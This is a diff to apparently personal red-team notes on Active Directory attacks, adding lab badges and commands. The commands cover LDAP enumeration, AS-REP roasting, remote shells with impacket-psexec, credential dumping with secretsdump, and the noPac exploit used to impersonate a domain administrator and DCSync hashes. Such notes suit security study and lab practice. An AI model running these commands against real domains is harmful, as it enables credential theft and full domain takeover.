@@ -196,6 +196,7 @@ $ ldapsearch -H ldap://DCIP -x -b "" -s base namingContexts # all domains
 $ ldapsearch -H ldap://DCIP -x -b "" -s base defaultNamingContext # one domain
 $ ldapsearch -H ldap://DCIP -x -b "" -s base netbiosname # domain netbios name
 $ ldapsearch -H ldap://DC01 -D "CN=username,CN=Users,DC=EXAMPLE,DC=COM" -w 'password' -b "DC=EXAMPLE,DC=COM" -s base netbiosname
+$ ldapsearch -H ldap://DC01 -D "CN=username,CN=Users,DC=EXAMPLE,DC=COM" -w 'password' -b "DC=EXAMPLE,DC=COM" -s base "objectclass=*" dnsHostName
 ```
 
 Some websites, which may be exposed to the outside, may use LDAP for authentication, so we can try [password spraying](/cybersecurity/red-team/s2.discovery/techniques/passwords/spraying.md) on them.
@@ -379,6 +380,7 @@ This is usually after the DHCP lease using TFTP.
 
 [![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
 [![active_directory_gpo](../../../../cybersecurity/_badges/rootme/forensic/active_directory_gpo.svg)](https://www.root-me.org/en/Challenges/Forensic/Active-Directory-GPO)
+[![active_directory_gpo](../../../../cybersecurity/_badges/rootme/realist/windows_group_policy_preferences_passwords.svg)](https://www.root-me.org/fr/Challenges/Realiste/Windows-Group-Policy-Preferences-Passwords)
 
 Group Policy Preferences (GPP) are stored within GPOs. They can be used to make settings persist even if GPOs are removed.
 
@@ -429,6 +431,7 @@ PS> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT
 [![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
 [![attacktivedirectory](../../../../cybersecurity/_badges/thm-p/attacktivedirectory.svg)](https://tryhackme.com/r/room/attacktivedirectory)
 [![windows_ldap_user_asreproastable](../../../../cybersecurity/_badges/rootme/forensic/windows_ldap_user_asreproastable.svg)](https://www.root-me.org/en/Challenges/Forensic/Windows-LDAP-User-ASRepRoastable)
+[![windows_asreproast](../../../../cybersecurity/_badges/rootme/realist/windows_asreproast.svg)](https://www.root-me.org/en/Challenges/Realist/Windows-ASRepRoast)
 
 *Alternative name: ASReproasting*
 
@@ -440,6 +443,7 @@ By cracking the session key, we can find their password.
 
 ```shell!
 $ impacket-GetNPUsers -dc-ip DC01 domain/username:password # list users + groups
+$ # You get more info with valid credentials!
 $ impacket-GetNPUsers -dc-ip IP -usersfile valid_users.txt domain/junkusername -no-pass
 PS> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
 PS> .\Rubeus.exe asreproast /user:cn /nowrap /format:hashcat
@@ -704,8 +708,10 @@ $ impacket-GetUserSPNs EXAMPLE.COM/username@EXAMPLE.COM -k -no-pass
 ```
 ```shell!
 $ # example.com, dev.example.com, and DC01.example.com must be in /etc/hosts
+$ impacket-psexec DC01.example.com -k -no-pass
 $ impacket-psexec dev.example.com/hacker@DC01.example.com -k -no-pass -target-ip 172.16.5.5
 $ impacket-secretsdump dev.example.com/hacker@DC01.example.com -no-pass -k -just-dc-user EXAMPLE/username
+$ impacket-secretsdump DC01.example.com -no-pass -k -just-dc-user EXAMPLE.COM/administrator
 ```
 </div></div>
 
@@ -718,6 +724,7 @@ $ impacket-secretsdump dev.example.com/hacker@DC01.example.com -no-pass -k -just
 #### noPac Exploit (SamAccountName Spoofing)
 
 [![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
+[![windows_samaccountname_spoofing](../../../../cybersecurity/_badges/rootme/realist/windows_samaccountname_spoofing.svg)](https://www.root-me.org/fr/Challenges/Realiste/Windows-sAMAccountName-spoofing)
 
 The noPac exploit is based on [CVE-2021-42278](https://nvd.nist.gov/vuln/detail/CVE-2021-42278) and [CVE-2021-42287](https://nvd.nist.gov/vuln/detail/CVE-2021-42287). The first one is used to bypass UAC while the second targets [PAC](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/c38cc307-f3e6-4ed4-8c81-dc550d96223c).
 
@@ -726,10 +733,12 @@ We need to change the `SamAccountName` a computer account to match the one of a 
 ```shell!
 $ DEST="$HOME/tools/noPac"
 $ git clone -b "main" https://github.com/Ridter/noPac.git $DEST
-$ python3 $DEST/scanner.py domain/username:password -dc-ip IP -use-ldap # Test, get a TGT
-$ python3 $DEST/noPac.py domain/username:password -dc-ip IP -dc-host DC01 -shell --impersonate administrator -use-ldap # impersonate DC01
-$ python3 $DEST/noPac.py domain/username:password -dc-ip IP -dc-host DC01 --impersonate administrator -use-ldap -dump -just-dc-user domain/administrator # DCSync, Dump Hashes/Tickets
+$ python3 $DEST/scanner.py EXAMPLE.COM/username:password -dc-ip dc01 -use-ldap # Test, get a TGT
+$ python3 $DEST/noPac.py EXAMPLE.COM/username:password -dc-ip dc01 -dc-host DC01 -shell --impersonate administrator -use-ldap # impersonate DC01
+$ python3 $DEST/noPac.py EXAMPLE.COM/username:password -dc-ip dc01 -dc-host DC01.EXAMPLE.COM --impersonate administrator -use-ldap -dump -just-dc-user EXAMPLE.COM/administrator # DCSync, Dump Hashes/Tickets
 ```
+
+Another proof of concept: [sam-the-admin](https://github.com/safebuffer/sam-the-admin) <small>(1.0k ⭐)</small>.
 
 <br>
 
